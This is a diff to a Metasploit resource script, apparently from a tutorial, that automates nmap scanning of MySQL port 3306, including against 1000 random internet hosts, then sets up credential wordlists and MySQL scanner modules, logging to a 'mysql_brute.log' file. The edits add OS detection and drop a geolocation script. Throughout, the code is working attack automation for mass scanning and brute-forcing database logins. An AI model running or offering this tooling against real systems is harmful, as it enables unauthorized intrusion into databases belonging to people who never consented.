@@ -489,7 +489,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
       Rex::sleep(2.0)
 
       if (framework.datastore['RANDOM_HOSTS'] == 'true')
-         print_line("RHOSTS => nmap -sV -Pn -T4 -iR 1000 -p 3306 --script=mysql-info.nse --open")
+         print_line("RHOSTS => nmap -sV -Pn -T4 -O -iR 1000 -p 3306 --script=mysql-info.nse --open")
       elsif (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
          run_single("setg RHOSTS 192.168.1.0/24")
       elsif (framework.datastore['RHOSTS'])
@@ -499,10 +499,10 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
          run_single("setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
       end
       unless (framework.datastore['RANDOM_HOSTS'] == 'true')
-         run_single("db_nmap -sV -Pn -T4 -p 3306 --script=mysql-info.nse,ip-geolocation-geoplugin.nse --open #{framework.datastore['RHOSTS']}")
+         run_single("db_nmap -sV -Pn -T4 -O -p 3306 --script=mysql-info.nse --open #{framework.datastore['RHOSTS']}")
       else
          print_warning("db_nmap: search for random remote targets with port 3306 open (mysql)")
-         run_single("db_nmap -sV -Pn -T4 -iR 1000 --script=mysql-info.nse,ip-geolocation-geoplugin.nse -p 3306 --open")
+         run_single("db_nmap -sV -Pn -T4 -O -iR 1000 --script=mysql-info.nse -p 3306 --open")
       end
 
       run_single("spool /root/mysql_brute.log")
@@ -528,11 +528,11 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
               return nil
          end
 
-         print_status("Operative systems detected: #{xname}")
+         print_status("Operative systems: #{xname}")
          run_single("setg RHOSTS #{xhost}")
          Rex::sleep(2.0)
          if xport =~ /3306/i
-              print_warning("Remote Target port: 3306 mysql found.")
+              print_warning("Remote Target port 3306 mysql found.")
               Rex::sleep(1.0)
               run_single("use auxiliary/scanner/mysql/mysql_version")
               run_single("set THREADS 20")
@@ -558,7 +558,6 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
        Rex::sleep(1.0)
        run_single("unsetg RHOSTS RANDOM_HOSTS USERPASS_FILE")
        run_single("unset THREADS VERBOSE USERNAME USERPASS_FILE PASSWORD STOP_ON_SUCCESS")
-       Rex::sleep(1.0)
        run_single("services -d")
        run_single("hosts -d")
        print_warning("Logfile stored under: /root/mysql_brute.log")
